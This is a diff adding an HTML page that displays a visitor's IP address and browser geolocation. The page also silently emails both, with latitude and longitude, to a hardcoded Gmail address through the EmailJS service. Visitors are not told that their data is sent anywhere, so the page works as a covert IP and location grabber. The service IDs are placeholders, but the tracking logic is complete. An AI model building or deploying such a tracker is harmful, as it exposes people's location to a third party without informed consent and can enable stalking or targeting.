@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>User Location and IP with Email</title>
+  <!-- Load EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function(){
+      // Initialize EmailJS with your User ID
+      emailjs.init("YOUR_USER_ID");
+    })();
+  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      text-align: center;
+      max-width: 500px;
+      width: 90%;
+    }
+    h1 {
+      color: #333;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 1.1em;
+      color: #555;
+      margin: 10px 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>User Info</h1>
+    <p id="ip">IP Address: Loading...</p>
+    <p id="location">Location: Loading...</p>
+  </div>
+  
+  <script>
+    // Variables to hold the fetched data.
+    let ipData = null;
+    let locationData = null;
+
+    // Function to send the gathered data via EmailJS.
+    function sendEmail() {
+      // Ensure both pieces of data have been attempted to collect.
+      if (ipData === null || locationData === null) return;
+
+      // Prepare the template parameters.
+      // The 'to_email' parameter is set to your target email address.
+      const templateParams = {
+        to_email: "amedameen830@gmail.com",
+        ip: ipData,
+        latitude: locationData.latitude,
+        longitude: locationData.longitude
+      };
+
+      // Send the email using EmailJS.
+      // Replace 'YOUR_SERVICE_ID' and 'YOUR_TEMPLATE_ID' with your EmailJS settings.
+      emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+        .then(function(response) {
+          console.log('SUCCESS!', response.status, response.text);
+        }, function(error) {
+          console.error('FAILED...', error);
+        });
+    }
+
+    // Fetch the user's IP address.
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        ipData = data.ip;
+        document.getElementById('ip').textContent = `IP Address: ${ipData}`;
+        console.log('User IP:', ipData);
+        sendEmail();
+      })
+      .catch(error => {
+        console.error('Error fetching IP:', error);
+        ipData = 'Unavailable';
+        document.getElementById('ip').textContent = 'IP Address: Unable to fetch';
+        sendEmail();
+      });
+
+    // Get the user's geolocation.
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          locationData = { latitude: lat, longitude: lon };
+          document.getElementById('location').textContent = `Location: Latitude ${lat}, Longitude ${lon}`;
+          console.log('User Location:', lat, lon);
+          sendEmail();
+        },
+        (error) => {
+          console.error('Error getting location:', error);
+          locationData = { latitude: 'Unavailable', longitude: 'Unavailable' };
+          document.getElementById('location').textContent = 'Location: Permission denied or unavailable';
+          sendEmail();
+        }
+      );
+    } else {
+      document.getElementById('location').textContent = 'Geolocation is not supported by this browser.';
+      locationData = { latitude: 'Not Supported', longitude: 'Not Supported' };
+      sendEmail();
+    }
+  </script>
+</body>
+</html>
